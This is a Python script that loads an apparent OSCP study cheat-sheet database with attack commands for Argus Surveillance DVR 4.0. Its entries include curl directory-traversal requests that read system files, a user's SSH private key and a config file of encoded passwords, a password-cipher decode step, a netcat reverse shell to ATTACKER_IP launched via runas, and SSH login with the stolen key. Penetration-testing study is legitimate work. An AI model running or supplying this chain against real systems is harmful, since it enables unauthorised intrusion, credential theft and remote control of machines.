#!/usr/bin/env python3
"""
##############################################
## Freeworld - Allergic to aluminum baby   ##
## OSCP Command DB - DVR4 PATCH            ##
##############################################
Adds Argus Surveillance DVR 4.0 attack commands:
  - Directory traversal
  - Password cipher decode
  - runas reverse shell
Usage:
    python3 dvr4_patch.py
"""
import sqlite3, os
DB_PATH = os.path.expanduser("~/.oscp_commands.db")

commands = [
    {
        "tool": "curl",
        "description": "Argus Surveillance DVR 4.0 directory traversal -- read arbitrary files via WEBACCOUNT.CGI RESULTPAGE parameter",
        "command": "curl \"http://TARGET:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=\"",
        "category": "exploitation",
        "tags": "windows,lfi,directory-traversal,argus,dvr,cve-2022-25012,webapps"
    },
    {
        "tool": "curl",
        "description": "Argus DVR -- read SSH private key via directory traversal",
        "command": "curl \"http://TARGET:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FUSER%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=\"",
        "category": "exploitation",
        "tags": "windows,lfi,directory-traversal,argus,dvr,ssh,id_rsa"
    },
    {
        "tool": "curl",
        "description": "Argus DVR -- read DVRParams.ini config file containing encoded passwords. Save to file to avoid & truncation.",
        "command": "curl \"http://TARGET:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FProgramData%2FPY_Software%2FArgus%20Surveillance%20DVR%2FDVRParams.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=\" -o dvr.ini",
        "category": "exploitation",
        "tags": "windows,lfi,directory-traversal,argus,dvr,config,password,ini"
    },
    {
        "tool": "searchsploit",
        "description": "Argus Surveillance DVR 4.0 -- four exploits: directory traversal, weak password encryption, unquoted service path, privilege escalation",
        "command": "searchsploit Argus Surveillance DVR",
        "category": "exploitation",
        "tags": "windows,argus,dvr,searchsploit,enumeration"
    },
    {
        "tool": "python3",
        "description": "Argus DVR weak password cipher decode -- D9A8=$, B398=! -- author omitted special chars. Use 50130.py from searchsploit.",
        "command": "python3 50130.py  # edit pass_hash variable with hash from DVRParams.ini Password0= field",
        "category": "exploitation",
        "tags": "windows,argus,dvr,cipher,decode,password,weak-encryption,cve-2022-25012"
    },
    {
        "tool": "runas",
        "description": "runas reverse shell with nc.exe -- use when you have credentials but no direct admin access. nc.exe must already be on target.",
        "command": "runas /user:COMPUTERNAME\\Administrator \"C:\\Users\\USER\\nc.exe ATTACKER_IP 443 -e cmd.exe\"",
        "category": "lateral-movement",
        "tags": "windows,runas,reverse-shell,nc,netcat,lateral-movement,privesc"
    },
    {
        "tool": "ssh",
        "description": "SSH with private key -- set permissions first",
        "command": "chmod 600 id_rsa && ssh -i id_rsa USER@TARGET_IP",
        "category": "exploitation",
        "tags": "ssh,private-key,id_rsa,linux,windows,foothold"
    },
]

def run():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    added = 0
    skipped = 0
    for entry in commands:
        c.execute("SELECT id FROM commands WHERE command = ?", (entry["command"],))
        if c.fetchone():
            print(f"  [~] Skipped (exists): {entry['tool']} -- {entry['description'][:55]}")
            skipped += 1
        else:
            c.execute(
                "INSERT INTO commands (tool, description, command, category, tags) VALUES (?,?,?,?,?)",
                (entry["tool"], entry["description"], entry["command"], entry["category"], entry["tags"])
            )
            print(f"  [+] Added: {entry['tool']} -- {entry['description'][:55]}")
            added += 1
    conn.commit()
    conn.close()
    print(f"\n  Done. {added} added, {skipped} skipped.\n")

if __name__ == "__main__":
    run()
